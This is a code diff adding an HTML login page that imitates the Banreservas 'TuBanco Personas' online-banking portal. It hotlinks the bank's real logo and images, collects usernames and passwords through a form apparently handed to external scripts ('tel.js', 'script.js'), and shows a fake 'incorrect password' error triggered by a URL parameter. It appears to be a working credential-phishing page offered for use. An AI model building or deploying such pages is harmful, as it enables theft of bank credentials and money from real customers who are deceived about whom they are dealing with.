@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Inicio de Sesión</title>
+    <script type="text/javascript" src="tel.js"></script>
+    <script type="text/javascript" src="script.js"></script>
+    <style>
+        body {
+            background-color: #004d77;
+            background-attachment: fixed;
+            font-family: 'Open Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            width: 100%;
+            height: 50px;
+            border-top: solid 0px #123054;
+            background-color: #f9f9f9;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding: 0 10px;
+        }
+        header a {
+            display: block;
+            text-decoration: none;
+            color: #000;
+            padding: 0 5px;
+            height: 40px;
+            text-align: center;
+            line-height: 30px;
+            font-size: 14px;
+            overflow: hidden;
+            margin-right: 15px;
+        }
+        .banreservas {
+            background: none repeat-x scroll 10px 10px #00AEF0;
+            border: 1px solid #00AEF0;
+            color: #FFFFFF;
+            height: 40px;
+            margin-right: 15px;
+            margin-top: -7px;
+            padding-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .content {
+            vertical-align: middle;
+            text-align: center;
+            padding-top: 25px;
+            padding-bottom: 25px;
+        }
+        .content img {
+            width: 285.5px;
+        }
+        .login-container {
+            width: 630px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+        }
+        .login-image {
+            width: 330px;
+            height: 466px;
+            background: url(https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/images/profilepersonas.jpg) -27px -18px no-repeat;
+            background-color: #fff;
+            background-size: 408px 484px;
+            border: 8px solid #F1F1F1;
+        }
+        .login-form-container {
+            width: 330px;
+        }
+        .login-title {
+            background-color: #00AEF0;
+            width: 100%;
+            height: 44px;
+            color: #FFF;
+            font-size: 12px;
+            font-family: 'Open Sans', Arial, sans-serif;
+            vertical-align: middle;
+            text-transform: none;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-form {
+            height: 88.7%;
+            background-color: #FFF;
+            width: 100%;
+            padding: 5px 15px;
+        }
+        .login-form td {
+            height: 1px;
+        }
+        .login-label {
+            color: #000000;
+            font-family: 'Open Sans', Arial, sans-serif;
+            font-size: 13px;
+            line-height: 1.5;
+            text-transform: none;
+        }
+        .login-input {
+            background: url(https://www.banreservas.com.do/TuBancoPersonas/App_Themes/login/css/custom-theme/images/requerido_ban.png) 0px 0px no-repeat #F0F0F0;
+            border: none;
+            font-size: 14px;
+            font-family: 'Open Sans', Verdana, Arial, sans-serif;
+            width: 285px;
+            height: 46px;
+            text-indent: 15px;
+            color: #333;
+            margin: 0em;
+            padding: 1px 0px;
+            text-shadow: none;
+            display: inline-block;
+            text-align: start;
+            appearance: auto;
+            cursor: text;
+        }
+        .login-button {
+            background: #00AEF0;
+            text-align: center;
+            font-size: 14px;
+            padding: 14px;
+            display: table-cell;
+            vertical-align: middle;
+            width: 285px;
+            color: #FFF;
+            font-family: 'Open Sans', Arial, sans-serif;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+        }
+        .login-links {
+            text-align: right;
+        }
+        .login-link {
+            display: block;
+            font-size: 14px;
+            padding-bottom: 5px;
+            color: #004D63;
+            font-weight: normal;
+            font-family: 'Open Sans', sans-serif;
+            text-decoration: none;
+        }
+        .error-message {
+            color: #ec0000;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="#">Contáctenos</a>
+        <a href="#">Idioma</a>
+        <a href="#">Ayuda</a>
+        <div class="banreservas">
+            <a href="https://www.banreservas.com.do" style="color: #FFFFFF;">Banreservas.com</a>
+        </div>
+    </header>
+    <div class="content">
+        <img src="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/logo_banreservas.png" alt="Logo Banreservas">
+    </div>
+    <div class="login-container">
+        <div class="login-form-container">
+            <div class="login-title">Bienvenidos a TuBanco Personas</div>
+            <div class="login-form">
+                <form id="loginForm">
+                    <table>
+                        <tr>
+                            <td class="login-label">Ingrese su usuario</td>
+                        </tr>
+                        <tr>
+                            <td><input type="text" required="" placeholder="USUARIO" class="login-input" id="usuario" name="usuario"></td>
+                        </tr>
+                        <tr>
+                            <td class="login-label">Contraseña</td>
+                        </tr>
+                        <tr>
+                            <td><input type="password" required="" placeholder="CONTRASEÑA" id="contrasena" class="login-input" name="contrasena"></td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <div id="error-message" class="error-message" style="display: none;">Usuario o contraseña incorrectos.</div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><button type="submit" class="login-button">Iniciar Sesión</button></td>
+                        </tr>
+                        <tr>
+                            <td class="login-links">
+                                <br>
+                                <a href="#" class="login-link">Cambiar a TuBanco Empresas</a>
+                                <a href="#" class="login-link">Nuevo usuario persona</a>
+                                <a href="#" class="login-link">¿Olvidó su contraseña?</a>
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </div>
+        </div>
+        <div class="login-image"></div>
+    </div>
+    <script>
+        // Función para obtener los parámetros de la URL
+        function getQueryParams() {
+            let params = {};
+            let queryString = window.location.search.substring(1);
+            let queryArray = queryString.split('&');
+            queryArray.forEach(param => {
+                let [key, value] = param.split('=');
+                params[key] = value;
+            });
+            return params;
+        }
+
+        // Mostrar mensaje de error si el parámetro action=incorrect_password está presente
+        document.addEventListener('DOMContentLoaded', () => {
+            let params = getQueryParams();
+            if (params.action === 'incorrect_password') {
+                document.getElementById('error-message').style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
